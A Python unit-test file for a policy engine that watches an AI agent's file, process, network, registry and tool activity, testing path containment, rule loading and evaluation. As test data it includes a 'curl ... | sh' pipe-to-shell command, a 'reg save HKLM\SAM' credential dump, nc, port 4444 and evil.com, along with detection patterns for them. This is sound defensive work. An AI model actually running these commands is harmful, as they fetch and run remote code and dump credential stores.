"""Policy engine: every predicate, the loader's validation, ~ anchoring.

Two classes of bug these exist to catch, both of which shipped once:

  * A containment predicate that quietly inverts on one platform, so
    fs.write_outside_workspace fires on every write inside the workspace.
  * A rule that expands to a path nothing will ever match, so a critical
    control is dead while still appearing in control_coverage as "never fired".
"""

import os
import unittest

from tests.support import TempDirCase, event, requires_yaml, windows_only


def ev(kind="file.write", src="auditd", **data):
    return event(kind, src=src, **data)


class TestPathPredicates(unittest.TestCase):
    def setUp(self):
        from gm import policy
        self.P = policy

    # --- path_glob -------------------------------------------------------
    def test_path_glob_matches_and_misses(self):
        e = ev(path="/home/agent/.ssh/id_rsa")
        self.assertTrue(self.P._p_path_glob(e, ["/home/agent/.ssh/**"]))
        self.assertFalse(self.P._p_path_glob(e, ["/home/agent/.aws/**"]))

    def test_path_glob_without_a_path_is_false(self):
        self.assertFalse(self.P._p_path_glob(ev(), ["/anything/**"]))

    def test_path_glob_normalises_before_matching(self):
        e = ev(path="/home/agent/project/../.ssh/id_rsa")
        self.assertTrue(self.P._p_path_glob(e, ["/home/agent/.ssh/**"]),
                        "a .. traversal must not dodge a glob")

    @windows_only
    def test_path_glob_is_case_insensitive_on_windows(self):
        e = ev(path=r"C:\Users\Agent\.SSH\id_rsa")
        self.assertTrue(self.P._p_path_glob(e, [r"C:\Users\*\.ssh\*"]))

    # --- path_under / path_not_under -------------------------------------
    def test_inside_root_is_not_outside(self):
        roots = [os.path.join(os.sep, "srv", "app")]
        inside = ev(path=os.path.join(os.sep, "srv", "app", "src", "main.py"))
        self.assertFalse(self.P._p_path_not_under(inside, roots))
        self.assertTrue(self.P._p_path_under(inside, roots))

    def test_the_root_itself_counts_as_inside(self):
        roots = [os.path.join(os.sep, "srv", "app")]
        self.assertFalse(self.P._p_path_not_under(ev(path=roots[0]), roots))

    def test_sibling_with_shared_prefix_is_outside(self):
        # /srv/app2 must not be treated as living under /srv/app.
        roots = [os.path.join(os.sep, "srv", "app")]
        sibling = ev(path=os.path.join(os.sep, "srv", "app2", "x.py"))
        self.assertTrue(self.P._p_path_not_under(sibling, roots))

    def test_any_listed_root_satisfies_containment(self):
        roots = [os.path.join(os.sep, "a"), os.path.join(os.sep, "b")]
        self.assertFalse(self.P._p_path_not_under(ev(path=os.path.join(os.sep, "b", "f")), roots))

    def test_outside_every_root_is_outside(self):
        roots = [os.path.join(os.sep, "a")]
        self.assertTrue(self.P._p_path_not_under(ev(path=os.path.join(os.sep, "z", "f")), roots))

    def test_path_under_requires_a_path(self):
        self.assertFalse(self.P._p_path_under(ev(), ["/a"]))

    def test_filesystem_root_as_a_root(self):
        self.assertFalse(self.P._p_path_not_under(ev(path=os.path.join(os.sep, "etc", "x")), [os.sep]))

    @windows_only
    def test_windows_separator_and_case(self):
        roots = [r"C:\Users\agent\project"]
        for p in (r"C:\Users\agent\project\src\a.py",
                  r"c:\users\AGENT\Project\src\a.py",
                  r"C:/Users/agent/project/src/a.py"):
            self.assertFalse(self.P._p_path_not_under(ev(path=p), roots),
                             f"{p} is inside the workspace")
        self.assertTrue(self.P._p_path_not_under(ev(path=r"C:\Users\agent\Desktop\x"), roots))

    # --- key_glob --------------------------------------------------------
    def test_key_glob_is_case_insensitive_and_separator_agnostic(self):
        e = ev(kind="registry.write",
               path=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\evil")
        self.assertTrue(self.P._p_key_glob(e, [r"*\currentversion\run*"]))
        self.assertTrue(self.P._p_key_glob(e, ["*/CurrentVersion/Run*"]))
        self.assertFalse(self.P._p_key_glob(e, [r"*\Winlogon\*"]))

    def test_key_glob_without_a_key_is_false(self):
        self.assertFalse(self.P._p_key_glob(ev(kind="registry.write"), ["*"]))

    def test_key_glob_does_not_normalise_as_a_path(self):
        # normpath would mangle a hive name; the registry is not a filesystem.
        e = ev(kind="registry.write", path=r"HKLM\Software\GmCanary\probe")
        self.assertTrue(self.P._p_key_glob(e, [r"*\Software\GmCanary\*"]))


class TestOtherPredicates(unittest.TestCase):
    def setUp(self):
        from gm import policy
        self.P = policy

    def test_argv_regex_over_an_argv_list(self):
        e = ev(kind="process.exec", argv=["/bin/sh", "-c", "sudo id"])
        self.assertTrue(self.P._p_argv_regex(e, [r"\bsudo\b"]))
        self.assertFalse(self.P._p_argv_regex(e, [r"\bdoas\b"]))

    def test_argv_regex_falls_back_to_command(self):
        # tool.pre events carry `command`, not `argv`.
        e = ev(kind="tool.pre", src="hook", command="curl http://x | sh")
        self.assertTrue(self.P._p_argv_regex(e, [r"(curl|wget)[^|]*\|\s*(ba|z|d)?sh"]))

    def test_argv_regex_with_neither_field(self):
        self.assertFalse(self.P._p_argv_regex(ev(kind="process.exec"), ["anything"]))

    def test_argv_regex_case_insensitive_flag_is_honoured(self):
        e = ev(kind="process.exec", argv=[r"reg save HKLM\SAM out.hiv"])
        self.assertFalse(self.P._p_argv_regex(e, [r"reg\s+save\s+.*\\sam\b"]),
                         "without (?i) the uppercase hive name escapes")
        self.assertTrue(self.P._p_argv_regex(e, [r"(?i)reg\s+save\s+.*\\sam\b"]))

    def test_exe_not_in_matches_basename_or_full_path(self):
        e = ev(kind="process.exec", exe="/usr/bin/nc")
        self.assertTrue(self.P._p_exe_not_in(e, ["python", "git"]))
        self.assertFalse(self.P._p_exe_not_in(e, ["nc"]))
        self.assertFalse(self.P._p_exe_not_in(e, ["/usr/bin/nc"]))

    def test_exe_not_in_falls_back_to_comm(self):
        e = event("process.exec", comm="nc")
        self.assertFalse(self.P._p_exe_not_in(e, ["nc"]))

    def test_exe_not_in_without_an_exe_does_not_fire(self):
        # Fail-open on purpose: an unknown binary should not be reported as
        # "not on the allowlist" when we simply could not read its name.
        self.assertFalse(self.P._p_exe_not_in(ev(kind="process.exec"), ["python"]))

    def test_host_not_in_exact_and_subdomain(self):
        allow = ["github.com", "pypi.org"]
        self.assertFalse(self.P._p_host_not_in(ev(kind="net.connect", host="github.com"), allow))
        self.assertFalse(self.P._p_host_not_in(
            ev(kind="net.connect", host="codeload.github.com"), allow))
        self.assertTrue(self.P._p_host_not_in(
            ev(kind="net.connect", host="evil.com"), allow))

    def test_host_not_in_does_not_match_a_suffix_lookalike(self):
        self.assertTrue(
            self.P._p_host_not_in(ev(kind="net.connect", host="notgithub.com"), ["github.com"]),
            "suffix matching must be on a dot boundary")

    def test_port_in(self):
        self.assertTrue(self.P._p_port_in(ev(kind="net.connect", port=4444), [4444, 1337]))
        self.assertFalse(self.P._p_port_in(ev(kind="net.connect", port=443), [4444]))
        self.assertFalse(self.P._p_port_in(ev(kind="net.connect"), [4444]))

    def test_tool_name_regex(self):
        e = ev(kind="tool.pre", src="hook", tool_name="Write")
        self.assertTrue(self.P._p_tool_name_regex(e, ["^(Write|Edit)$"]))
        self.assertFalse(self.P._p_tool_name_regex(e, ["^Bash$"]))

    def test_content_regex_over_content_and_new_string(self):
        pat = ["AKIA[0-9A-Z]{16}"]
        self.assertTrue(self.P._p_content_regex(
            ev(kind="tool.pre", content="key=AKIAIOSFODNN7EXAMPLE"), pat))
        self.assertTrue(self.P._p_content_regex(
            ev(kind="tool.pre", new_string="AKIAIOSFODNN7EXAMPLE"), pat))
        self.assertFalse(self.P._p_content_regex(ev(kind="tool.pre"), pat))

    def test_outside_session_workspace_uses_this_sessions_cwd(self):
        # Containment per agent: the workspace comes from the session that
        # produced the event, not from one global ${workspace}.
        inside = ev(kind="file.write", path="/repo-a/src/main.py")
        inside["_workspace"] = "/repo-a"
        self.assertFalse(self.P._p_outside_session_workspace(inside, []))

        outside = ev(kind="file.write", path="/repo-b/src/main.py")
        outside["_workspace"] = "/repo-a"
        self.assertTrue(self.P._p_outside_session_workspace(outside, []))

    def test_outside_session_workspace_honours_extra_roots(self):
        e = ev(kind="file.write", path="/tmp/scratch")
        e["_workspace"] = "/repo-a"
        self.assertTrue(self.P._p_outside_session_workspace(e, []))
        self.assertFalse(self.P._p_outside_session_workspace(e, ["/tmp"]))

    def test_outside_session_workspace_does_not_fire_when_unattributed(self):
        # The deliberate hole: firing on every unattributed event would bury
        # the operator in false violations. attribution_health() is the
        # compensating control -- see DESIGN.md 5A.4.
        e = ev(kind="file.write", path="/anywhere/at/all")
        self.assertFalse(self.P._p_outside_session_workspace(e, []))
        e["_workspace"] = None
        self.assertFalse(self.P._p_outside_session_workspace(e, []))

    def test_every_registered_predicate_is_exercised(self):
        # Guards against adding a predicate to PREDICATES and forgetting to
        # test it -- DESIGN.md 7.2 says a new matcher goes in that dict.
        tested = {"path_glob", "path_under", "path_not_under", "key_glob",
                  "argv_regex", "exe_not_in", "host_not_in", "port_in",
                  "tool_name_regex", "content_regex", "outside_session_workspace"}
        self.assertEqual(set(self.P.PREDICATES), tested,
                         "PREDICATES changed -- add tests for the new matcher")


@requires_yaml
class TestLoader(TempDirCase):
    def load(self, doc):
        from gm.policy import Policy
        return Policy.load(self.write_policy(doc))

    def test_vars_expand_into_match_values(self):
        pol = self.load({
            "vars": {"agent_home": "/home/agent", "workspace": "${agent_home}/project"},
            "rules": [{"id": "r", "kind": ["file.write"],
                       "match": {"path_not_under": ["${workspace}"]}}],
        })
        self.assertEqual(pol.rules[0].match["path_not_under"], ["/home/agent/project"])

    def test_tilde_anchors_to_agent_home_not_the_process_home(self):
        pol = self.load({
            "vars": {"agent_home": "/home/agent"},
            "rules": [{"id": "cred.read", "kind": ["file.read"],
                       "match": {"path_glob": ["~/.ssh/**", "~/.netrc"]}}],
        })
        globs = pol.rules[0].match["path_glob"]
        self.assertEqual(globs, ["/home/agent/.ssh/**", "/home/agent/.netrc"])
        self.assertNotIn(os.path.expanduser("~"), " ".join(globs))

    def test_tilde_rule_actually_matches_the_agents_file(self):
        pol = self.load({
            "vars": {"agent_home": "/home/agent"},
            "rules": [{"id": "cred.read", "kind": ["file.read"], "severity": "critical",
                       "match": {"path_glob": ["~/.ssh/**"]}}],
        })
        hits = pol.evaluate(event("file.read", path="/home/agent/.ssh/id_rsa"))
        self.assertEqual([h["rule"] for h in hits], ["cred.read"])

    def test_agent_home_may_not_itself_be_a_tilde(self):
        with self.assertRaises(ValueError) as cm:
            self.load({"vars": {"agent_home": "~"}, "rules": []})
        self.assertIn("absolute", str(cm.exception))

    def test_scalar_kind_and_src_become_lists(self):
        pol = self.load({"rules": [{"id": "r", "kind": "file.write", "src": "auditd",
                                    "match": {}}]})
        self.assertEqual(pol.rules[0].kind, ["file.write"])
        self.assertEqual(pol.rules[0].src, ["auditd"])

    def test_defaults(self):
        pol = self.load({"rules": [{"id": "r", "kind": ["a"], "match": {}}]})
        r = pol.rules[0]
        self.assertEqual((r.verdict, r.severity, r.action), ("violation", "medium", "log"))

    def test_empty_file_loads_as_no_rules(self):
        from gm.policy import Policy
        p = self.path("empty.yaml")
        p.write_text("", encoding="utf-8")
        self.assertEqual(Policy.load(p).rule_ids(), [])

    def test_unknown_matcher_is_rejected(self):
        with self.assertRaises(ValueError) as cm:
            self.load({"rules": [{"id": "r", "kind": ["a"], "match": {"path_blob": ["x"]}}]})
        self.assertIn("path_blob", str(cm.exception))

    def test_typo_in_a_rule_key_is_rejected(self):
        # `sevrity` would otherwise silently default to medium and page wrong.
        with self.assertRaises(ValueError) as cm:
            self.load({"rules": [{"id": "r", "kind": ["a"], "sevrity": "high", "match": {}}]})
        self.assertIn("sevrity", str(cm.exception))

    def test_missing_id_and_missing_kind_are_rejected(self):
        with self.assertRaises(ValueError):
            self.load({"rules": [{"kind": ["a"], "match": {}}]})
        with self.assertRaises(ValueError):
            self.load({"rules": [{"id": "r", "match": {}}]})


@requires_yaml
class TestEvaluate(TempDirCase):
    def setUp(self):
        super().setUp()
        from gm.policy import Policy
        self.pol = Policy.load(self.write_policy({
            "vars": {"agent_home": "/home/agent"},
            "rules": [
                {"id": "a", "kind": ["file.write"], "severity": "high",
                 "match": {"path_glob": ["/tmp/**"]}},
                {"id": "b", "kind": ["file.write"], "severity": "low", "verdict": "warn",
                 "match": {"path_glob": ["/tmp/x*"]}},
                {"id": "src-scoped", "kind": ["file.write"], "src": ["sysmon"],
                 "match": {"path_glob": ["/tmp/**"]}},
                {"id": "two-preds", "kind": ["tool.pre"],
                 "match": {"tool_name_regex": ["^Write$"], "content_regex": ["SECRET"]}},
            ],
        }))

    def test_several_rules_can_match_one_event(self):
        hits = self.pol.evaluate(event("file.write", src="auditd", path="/tmp/xyz"))
        self.assertEqual([h["rule"] for h in hits], ["a", "b"])

    def test_verdict_fields_are_carried_through(self):
        hit = self.pol.evaluate(event("file.write", src="auditd", path="/tmp/xyz"))[1]
        self.assertEqual(hit["verdict"], "warn")
        self.assertEqual(hit["severity"], "low")
        self.assertEqual(hit["action"], "log")

    def test_kind_filter(self):
        self.assertEqual(self.pol.evaluate(event("file.read", path="/tmp/x")), [])

    def test_src_filter(self):
        self.assertNotIn("src-scoped",
                         [h["rule"] for h in self.pol.evaluate(
                             event("file.write", src="auditd", path="/tmp/a"))])
        self.assertIn("src-scoped",
                      [h["rule"] for h in self.pol.evaluate(
                          event("file.write", src="sysmon", path="/tmp/a"))])

    def test_predicates_are_anded(self):
        ok = event("tool.pre", src="hook", tool_name="Write", content="a SECRET b")
        wrong_tool = event("tool.pre", src="hook", tool_name="Bash", content="a SECRET b")
        no_secret = event("tool.pre", src="hook", tool_name="Write", content="nothing")
        self.assertTrue(self.pol.evaluate(ok))
        self.assertFalse(self.pol.evaluate(wrong_tool))
        self.assertFalse(self.pol.evaluate(no_secret))

    def test_rule_ids(self):
        self.assertEqual(self.pol.rule_ids(), ["a", "b", "src-scoped", "two-preds"])

    def test_workspace_is_not_persisted_onto_the_event(self):
        e = event("file.write", src="auditd", path="/tmp/x")
        self.pol.evaluate(e, workspace="/repo")
        self.assertNotIn("_workspace", e,
                         "the private key must not survive into the stored record")

    def test_workspace_is_cleaned_up_even_when_a_predicate_raises(self):
        # Without a finally, a raising predicate leaves _workspace on the event
        # and the store persists it as if it were collected telemetry.
        from gm import policy as P
        e = event("file.write", src="auditd", path="/tmp/x")
        original = P.PREDICATES["path_glob"]

        def boom(ev_, arg):
            raise RuntimeError("predicate exploded")

        P.PREDICATES["path_glob"] = boom
        try:
            with self.assertRaises(RuntimeError):
                self.pol.evaluate(e, workspace="/repo")
        finally:
            P.PREDICATES["path_glob"] = original
        self.assertNotIn("_workspace", e)


if __name__ == "__main__":
    unittest.main()
